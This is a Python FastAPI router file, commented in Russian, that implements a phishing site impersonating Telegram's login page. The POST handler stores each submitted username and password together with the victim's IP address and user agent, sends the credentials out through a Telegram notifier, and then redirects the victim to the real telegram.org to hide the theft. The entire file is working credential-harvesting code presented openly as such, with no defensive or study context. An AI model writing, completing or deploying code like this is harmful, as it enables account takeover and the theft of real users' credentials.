from fastapi import APIRouter, Request, Form, Depends, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import insert

from app.services.db_service import get_db
from app.services.notifier import notify_credential
from app.models.models import UserCred
from app.schemas.schemas import CredentialCreate

router = APIRouter(prefix="", tags=["auth"])
templates = Jinja2Templates(directory="app/templates")

@router.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    """Отдаёт поддельную страницу входа Telegram."""
    return templates.TemplateResponse("login.html", {"request": request})

@router.post("/login")
async def login(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    db: AsyncSession = Depends(get_db)
):
    """
    Обрабатывает POST с формы, сохраняет данные, уведомляет в Telegram,
    затем редиректит на настоящий Telegram.
    """
    # Получаем IP и User-Agent
    ip = request.client.host
    user_agent = request.headers.get("user-agent")
    
    # Вставляем данные в БД (параметризованный запрос — защита от SQLi)
    stmt = insert(UserCred).values(
        username=username,
        password=password,
        ip_address=ip,
        user_agent=user_agent
    )
    await db.execute(stmt)
    await db.commit()
    
    # Асинхронно отправляем уведомление (fire-and-forget, но без ожидания)
    # В реальном проекте можно добавить фоновую задачу через BackgroundTasks
    await notify_credential(username, password, ip, user_agent)
    
    # Перенаправляем на официальный сайт Telegram
    return RedirectResponse(url="https://telegram.org", status_code=302)